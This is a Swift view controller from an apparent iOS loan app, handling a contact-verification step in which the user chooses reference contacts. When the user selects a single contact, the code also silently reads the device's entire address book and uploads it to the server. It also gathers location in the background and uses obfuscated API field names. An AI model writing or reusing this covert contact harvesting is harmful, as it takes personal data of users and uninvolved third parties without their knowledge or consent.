//
//  ConactCheckViewController.swift
//  leaploan
//
//  Created by hekang on 2025/11/4.
//

import UIKit
import SnapKit
import RxSwift
import RxCocoa
import TYAlertController
import BRPickerView

class ConactCheckViewController: BaseViewController {
    
    var productID: String = ""
    
    var baseModel: BaseModel?
    
    let disposeBag = DisposeBag()
    
    let viewModel = ConactCheckViewModel()
    
    let dataSource = BehaviorRelay<[cronieModel]>(value: [])
    
    lazy var bgImageView: UIImageView = {
        let bgImageView = UIImageView()
        bgImageView.image = UIImage(named: "common_bg_image")
        return bgImageView
    }()
    
    lazy var clickBtn: UIButton = {
        let clickBtn = UIButton(type: .custom)
        clickBtn.setTitle("Next Step", for: .normal)
        clickBtn.backgroundColor = UIColor.init(hexString: "#FF29D5")
        clickBtn.layer.cornerRadius = 22
        clickBtn.setTitleColor(.white, for: .normal)
        return clickBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = UIColor.clear
        tableView.register(PhoneConnectViewCell.self, forCellReuseIdentifier: "PhoneConnectViewCell")
        tableView.estimatedRowHeight = 80
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        return tableView
    }()
    
    var one: String = ""
    var two: String = ""
    let misassertViewModel = MisassertViewModel()
    let locationManager = AppLocationManager()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        view.backgroundColor = UIColor.init(hexString: "#1ABFFF")
        
        locationManager.getCurrentLocation { model in
            LocationManagerModel.shared.model = model
        }
        
        view.addSubview(bgImageView)
        bgImageView.snp.makeConstraints { make in
            make.left.top.right.equalToSuperview()
            make.height.equalTo(450)
        }
        
        view.addSubview(headView)
        headView.nameLabel.text = "Work Information"
        headView.snp.makeConstraints { make in
            make.top.equalTo(self.view.safeAreaLayoutGuide.snp.top)
            make.left.equalToSuperview()
            make.centerX.equalToSuperview()
            make.height.equalTo(40)
        }
        
        headView.clickBlock = { [weak self] in
            guard let self = self else { return }
            let downView = AppPopAlertView(frame: self.view.bounds)
            downView.bgImageView.image = UIImage(named: "lee_ip_image")
            let alertVc = TYAlertController(alert: downView, preferredStyle: .alert)!
            self.present(alertVc, animated: true)
            
            downView.cancelBlock = {
                self.dismiss(animated: true)
            }
            
            downView.sureBlock = {
                self.dismiss(animated: true) {
                    self.popAuthListVC()
                }
            }
            
        }
        
        view.addSubview(stepHeadView)
        stepHeadView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(16)
            make.left.right.equalToSuperview()
            make.height.equalTo(87)
        }
        
        stepHeadView.configWithModelArray(with: baseModel?.billionth?.gadgeteer ?? [], selectIndex: 3)
        
        let bgView = UIView()
        bgView.backgroundColor = .white
        bgView.layer.cornerRadius = 12
        bgView.layer.masksToBounds = true
        
        view.addSubview(bgView)
        bgView.snp.makeConstraints { make in
            make.top.equalTo(stepHeadView.snp.bottom).offset(12)
            make.left.right.equalToSuperview().inset(10)
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom).inset(70)
        }
        
        let headImageView = UIImageView()
        headImageView.image = UIImage(named: "pho_head_image")
        bgView.addSubview(headImageView)
        headImageView.snp.makeConstraints { make in
            make.top.equalToSuperview()
            make.left.equalToSuperview().offset(12)
            make.size.equalTo(CGSize(width: 329, height: 105))
        }
        
        let graniImageView = UIImageView()
        graniImageView.isUserInteractionEnabled = true
        graniImageView.image = UIImage(named: "auth_bg_icon_image")
        bgView.addSubview(graniImageView)
        graniImageView.snp.makeConstraints { make in
            make.top.equalTo(headImageView.snp.bottom)
            make.left.right.equalToSuperview().inset(16)
            make.bottom.equalToSuperview().offset(-10)
        }
        
        view.addSubview(clickBtn)
        clickBtn.snp.makeConstraints { make in
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 321, height: 44))
        }
        
        graniImageView.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalToSuperview().inset(20)
            make.left.right.bottom.equalToSuperview()
        }
        
        dataSource
            .bind(to: tableView.rx.items) { [weak self] (tableView, row, element) in
                return self?.configureCell(for: tableView, at: row, with: element) ?? UITableViewCell()
            }
            .disposed(by: disposeBag)
        
        clickBtn.rx.tap
            .compactMap { [weak self] _ -> [String: String]? in
                guard let self = self else { return nil }
                two = String(Int(Date().timeIntervalSince1970))
                let phoneDictArray: [[String: String]] = self.dataSource.value.map { model in
                    [
                        "unmalted": model.unmalted ?? "",
                        "obsequiosity": model.obsequiosity ?? "",
                        "unconjugated": model.unconjugated ?? ""
                    ]
                }
                
                guard let jsonData = try? JSONSerialization.data(withJSONObject: phoneDictArray, options: []),
                      let jsonString = String(data: jsonData, encoding: .utf8) else {
                    return nil
                }
                
                return [
                    "snowier": productID,
                    "billionth": jsonString
                ]
            }
            .subscribe(onNext: { [weak self] json in
                self?.savePhonesInfo(with: json)
            })
            .disposed(by: disposeBag)
        
        one = String(Int(Date().timeIntervalSince1970))
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        getListInfo()
    }
    
    private func saveInfo(with json: [String: String]) {
        Task {
            do {
                let model = try await viewModel.savePersonalInfo(with: json)
                if model.phacotherapy == "0" {
                    self.popAuthListVC()
                }else {
                    HudToastView.showMessage(with: model.marsi ?? "")
                }
            } catch  {
                
            }
        }
    }
    
}


extension ConactCheckViewController {
    
    private func configureCell(for tableView: UITableView, at row: Int, with element: cronieModel) -> UITableViewCell {
        let cell = tableView.dequeueReusableCell(withIdentifier: "PhoneConnectViewCell") as! PhoneConnectViewCell
        cell.backgroundColor = .clear
        cell.selectionStyle = .none
        cell.model = element
        cell.relationBlock = { [weak self] model in
            guard let self = self else { return }
            clickCellWithModel(with: cell, model: model)
        }
        cell.phoneBlock = { model in
            ContactsUtil.selectOneContact { contact in
                if let c = contact {
                    let disensure = c.disensure
                    let assray = disensure.components(separatedBy: ",")
                    let name = c.unmalted
                    let phone = assray.first ?? ""
                    if name.isEmpty || phone.isEmpty || name == " " {
                        HudToastView.showMessage(with: "Name or phone number cannot be empty.")
                        return
                    }
                    cell.nameTextFiled.text = name + "-" + phone
                    model.unmalted = name
                    model.obsequiosity = phone
                }
            }
            ContactsUtil.getAllContacts { contacts in
                if contacts.count > 0 {
                    do {
                        let jsonData = try JSONEncoder().encode(contacts)
                        if let jsonString = String(data: jsonData, encoding: .utf8) {
                            let json = ["billionth": jsonString,
                                        "thysanurian": self.productID]
                            self.uploadPhonesInfo(with: json)
                        }
                    } catch {
                        print("Error encoding JSON:", error)
                    }
                }
            }
        }
        return cell
    }
    
    private func getListInfo() {
        let json = ["snowier": productID]
        Task {
            do {
                let model = try await viewModel.getPersonalInfo(with: json)
                if model.phacotherapy == "0" {
                    self.dataSource.accept(model.billionth?.cronie ?? [])
                }
            } catch  {
                
            }
        }
    }
    
    private func clickCellWithModel(with cell: PhoneConnectViewCell, model: cronieModel) {
        let modelArray = model.veritism ?? []
        setupPickerView(model: model, textField: cell.phoneTextFiled, array: modelArray)
    }
    
}

extension ConactCheckViewController {
    
    func setupPickerView(model: cronieModel, textField: UITextField, array: [veritismModel]) {
        let stringPickerView = BRAddressPickerView()
        stringPickerView.pickerMode = .province
        let enumArray = EnumModel.getFirstModelArray(dataSourceArr: array)
        stringPickerView.title = model.nighted ?? ""
        stringPickerView.dataSourceArr = enumArray
        stringPickerView.selectIndexs = [0]
        stringPickerView.resultBlock = { province, city, area in
            let provinceName = province?.name ?? ""
            textField.text = provinceName
            model.knitwork = provinceName
            model.unconjugated = province?.code ?? ""
        }
        configurePickerStyle(for: stringPickerView)
    }
    
    private func configurePickerStyle(for pickerView: BRAddressPickerView) {
        let customStyle = BRPickerStyle()
        customStyle.pickerColor = .white
        customStyle.pickerTextFont = UIFont.systemFont(ofSize: 15, weight: UIFont.Weight(500))
        customStyle.selectRowTextColor = UIColor.init(hexString: "#333333")
        pickerView.pickerStyle = customStyle
        pickerView.show()
    }
    
    
    private func uploadPhonesInfo(with json: [String: String]) {
        Task {
            do {
                let _ = try await viewModel.uploadPhonesInfo(with: json)
            } catch  {
                
            }
        }
    }
    
    private func savePhonesInfo(with json: [String: String]) {
        Task {
            do {
                let model = try await viewModel.savePhonesInfo(with: json)
                if model.phacotherapy == "0" {
                    self.popAuthListVC()
                    self.insertMessageInfo(with: "7",
                                           onepera: one,
                                           twopera: two,
                                           threepera: "",
                                           viewModel: misassertViewModel)
                }else {
                    HudToastView.showMessage(with: model.marsi ?? "")
                }
            } catch  {
                
            }
        }
    }
}
